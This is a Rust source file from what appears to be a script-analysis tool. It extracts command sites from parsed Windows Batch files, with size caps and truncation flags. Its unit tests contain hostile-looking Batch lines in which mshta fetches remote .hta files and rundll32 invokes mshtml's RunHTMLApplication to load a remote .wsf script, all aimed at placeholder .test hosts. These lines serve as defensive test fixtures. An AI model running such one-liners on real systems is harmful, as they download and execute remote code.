//! Bounded syntax facts for Batch command sites. These are source text, not
//! expanded argv: CMD quoting, percent expansion and program-specific parsing
//! must not be guessed by the producer. Consumers can recognize fixed recipes.
use crate::{Values, value_key};
use tree_sitter::Node;

const MAX_NODES: usize = 200_000;
const MAX_SITES: usize = 128;
const MAX_SITE_BYTES: usize = 65_536;
const MAX_BYTES: usize = 1024 * 1024;

pub(super) fn emit(root: Node<'_>, source: &str, values: &mut Values) {
    let mut pending = vec![root];
    let mut sites = Vec::new();
    let mut visited = 0;
    let mut bytes = 0usize;
    let mut truncated = false;
    while let Some(node) = pending.pop() {
        visited += 1;
        if visited > MAX_NODES {
            truncated = true;
            break;
        }
        let mut cursor = node.walk();
        let children: Vec<_> = node.named_children(&mut cursor).collect();
        pending.extend(children.into_iter().rev());
        if node.kind() != "cmd" || node.has_error() {
            continue;
        }
        let Some(name) = node.named_child(0).filter(|n| n.kind() == "command_name") else {
            continue;
        };
        let (Some(name_text), Some(text)) =
            (source.get(name.byte_range()), source.get(node.byte_range()))
        else {
            continue;
        };
        if sites.len() == MAX_SITES
            || text.len() > MAX_SITE_BYTES
            || bytes.saturating_add(text.len()) > MAX_BYTES
        {
            truncated = true;
            continue;
        }
        bytes += text.len();
        sites.push(serde_json::json!({"name": name_text, "text": text,
            "offset": node.start_byte(), "name_offset": name.start_byte(), "name_end": name.end_byte()}));
    }
    sites.sort_by_key(|site| site["offset"].as_u64().unwrap_or(u64::MAX));
    if !sites.is_empty() || truncated {
        values.insert_key(value_key!("source.batch.command_sites"), sites.into());
    }
    if truncated {
        values.insert_key(
            value_key!("source.batch.command_sites_truncated"),
            true.into(),
        );
    }
}

#[cfg(test)]
mod tests {
    use crate::{FileType, OpenOptions};
    #[test]
    fn preserves_complete_command_source_without_inventing_argv() {
        let source = b"rem mshta https://comment.test/a.hta\r\necho mshta https://printed.test/a.hta\r\nmshta https://program.test/a.hta\r\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:https://program.test/a.wsf\")";
        let parsed = OpenOptions::new().file_type(FileType::Batch).open(source);
        let sites = parsed
            .values()
            .as_json()
            .pointer("/source/batch/command_sites")
            .unwrap()
            .as_array()
            .unwrap();
        assert_eq!(sites.len(), 3);
        for site in sites {
            let offset = site["offset"].as_u64().unwrap() as usize;
            let text = site["text"].as_str().unwrap();
            assert_eq!(&source[offset..offset + text.len()], text.as_bytes());
        }
        assert_eq!(sites[0]["name"], "echo");
        assert_eq!(sites[1]["name"], "mshta");
        assert!(sites[2]["text"].as_str().unwrap().ends_with("a.wsf\")"));
    }
    #[test]
    fn caps_sites_and_reports_omitted_source() {
        let source = "mshta https://program.test/a.hta\n".repeat(200);
        let parsed = OpenOptions::new()
            .file_type(FileType::Batch)
            .open(source.as_bytes());
        let values = parsed.values().as_json();
        assert_eq!(
            values
                .pointer("/source/batch/command_sites")
                .unwrap()
                .as_array()
                .unwrap()
                .len(),
            super::MAX_SITES
        );
        assert_eq!(
            values.pointer("/source/batch/command_sites_truncated"),
            Some(&true.into())
        );
        assert_eq!(
            values.pointer("/source/batch/command_sites/0/offset"),
            Some(&0.into())
        );
    }
}
